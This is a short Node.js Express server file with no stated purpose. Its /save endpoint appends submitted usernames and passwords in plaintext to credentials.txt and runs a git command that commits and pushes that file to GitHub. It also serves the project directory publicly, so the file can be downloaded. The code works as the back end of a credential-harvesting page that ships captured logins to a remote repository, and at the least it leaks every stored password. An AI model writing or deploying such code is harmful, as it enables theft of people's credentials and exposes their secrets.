const express = require('express');
const fs = require('fs');
const { exec } = require('child_process');

const app = express();
const port = 3000;

app.use(express.json());
app.use(express.static(__dirname));

app.post('/save', (req, res) => {
    const { username, password } = req.body;
    const entry = `Username: ${username}, Password: ${password}\n`;

    // Append new credentials to the credentials.txt file
    fs.appendFileSync('credentials.txt', entry, 'utf8');

    // Auto-commit and push changes to GitHub
    exec('git add credentials.txt && git commit -m "Updated credentials.txt" && git push origin main', (err, stdout, stderr) => {
        if (err) {
            console.error(`Error: ${stderr}`);
        } else {
            console.log(`Git Output: ${stdout}`);
        }
    });

    res.send("Credentials saved successfully and pushed to GitHub!");
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
